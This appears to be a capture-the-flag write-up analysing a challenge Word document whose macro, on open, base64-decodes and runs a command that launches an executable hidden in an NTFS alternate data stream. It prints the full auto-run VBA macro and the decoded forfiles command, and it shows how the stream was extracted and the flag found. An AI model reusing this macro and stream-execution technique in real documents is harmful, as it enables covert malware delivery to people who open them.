## Description

The office is a dangerous place. Last week Pam (the secretary) got an email, containing an archive. She ALMOST opened it, but then she remembered the IT security training from last month and fortunately decided to send the file to you. Somethings was phishy about the sender address to her. It was a close call to say the least...

__IMPORTANT NOTES__

 1. This challenge cannot be solved on any file systems other than NTFS.
 2. If you want to see the challenge in action, you have to use a Windows box with Office installed. In addition, add the folder where the challenge is extracted to to `Trusted Locations` ([help for that](https://support.microsoft.com/en-us/office/add-remove-or-change-a-trusted-location-7ee1cdc2-483e-4cbb-bcb3-4e7c67147fb4)). The challenge can be solved without actually running anything.
 3. Windows Defender and other AVs might flag the files as dangerous, these are false positive alerts.

## Solution

I've read enough stuff about CTFs and Word documents, to know, that we are looking at a VBA script challenge. Setting up a VM, and opening the Word doc, a totally not sus command prompt is opened. I quickly extracted the VBA script using [olevba](https://github.com/decalage2/oletools/wiki/olevba). Its a not so big script, so thankfully, it isn't VBA reversing.
```vba
Private Sub Document_Open()

Dim DecodedCode
DecodedCode = DecodeBase64("Zm9yZmlsZXMgL1AgQzpcV2luZG93c1xTeXN0ZW0zMiAvbSBjYWxjLmV4ZSAvYyAlY2QlXHNlY3JldC50eHQ6aGFjay5leGU=")

CreateObject("WScript.Shell").Exec ("cmd /c " & DecodedCode)


End Sub

Function DecodeBase64(b64$)
    Dim b
    With CreateObject("Microsoft.XMLDOM").createElement("b64")
        .DataType = "bin.base64": .Text = b64
        b = .nodeTypedValue
        With CreateObject("ADODB.Stream")
            .Open: .Type = 1: .Write b: .Position = 0: .Type = 2: .Charset = "utf-8"
            DecodeBase64 = .ReadText
            .Close
        End With
    End With
End Function
```

The code above is run once on opening the document. Decoding the base64 string, we can see, that we are running the following command:
```powershell
cmd /c forfiles /P C:\Windows\System32 /m calc.exe /c %cd%\secret.txt:hack.exe
```
This basically runs the command forfiles, which is just a magic for running the command defined with the second `/c` only once (since `calc.exe` is matched once only in the `C:\Windows\System32` directory).
It does some magic with the `secret.txt` file. And what is that syntax with the colon? Turns out the reason why `NTFS` was requested is [Alternate Datastreams](https://www.faqforge.com/windows/use-alternate-datastreams-to-hide-important-files-windows-ntfs/).
I wrote a quick few-liner in python to extract the data (I suck at ps, sorry):
```python
with open('secret.txt:hack.exe', 'rb') as f:
    with open('hack.exe', 'wb') as f2:
        f2.write(f.read())
```

All is left for us, to dig the flag out from the `hack.exe` binary. Loading the binary into `Ghidra` and doing a quick search for "flag" gets the job done:
```
cd22{HIDDEN}
```
